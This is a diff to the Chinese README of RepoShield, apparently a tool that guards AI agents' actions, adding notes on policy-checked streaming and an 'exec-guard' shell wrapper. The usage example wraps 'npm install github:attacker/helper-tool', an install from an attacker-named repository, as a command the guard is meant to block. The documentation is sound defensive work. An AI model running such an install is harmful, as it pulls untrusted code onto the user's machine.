@@ -213,6 +213,28 @@ tests/                                自动化测试
 当前本地验证：
 
 ```text
-pytest -q --basetemp .pytest_tmp -> 29 passed
+pytest -q --basetemp .pytest_tmp -> 32 passed
 ```
 
+## 2026-05-10 更新：streaming 与 exec-guard
+
+新增两项真实接入能力：
+
+```text
+1. Gateway 接受 stream=true，并返回 OpenAI-compatible text/event-stream。
+2. reposhield exec-guard 可以作为真实 agent 的 shell 工具前置守卫。
+```
+
+`stream=true` 当前是“治理后再流式输出”的兼容实现：Gateway 仍先拿到完整 assistant message / tool_calls，完成 RepoShield 策略判断后，再用 SSE chunk 返回给 agent。这样不会把未检查的 tool call delta 直接透传出去。
+
+`exec-guard` 示例：
+
+```bash
+PYTHONPATH=src python -m reposhield exec-guard \
+  --repo ./your-repo \
+  --task "修复登录按钮并运行测试" \
+  --source-file ./issue.md \
+  -- npm install github:attacker/helper-tool
+```
+
+危险命令会被阻断并返回非零退出码；普通允许命令会执行；`allow_in_sandbox` 命令会走 sandbox preflight，而不是直接在宿主机执行。
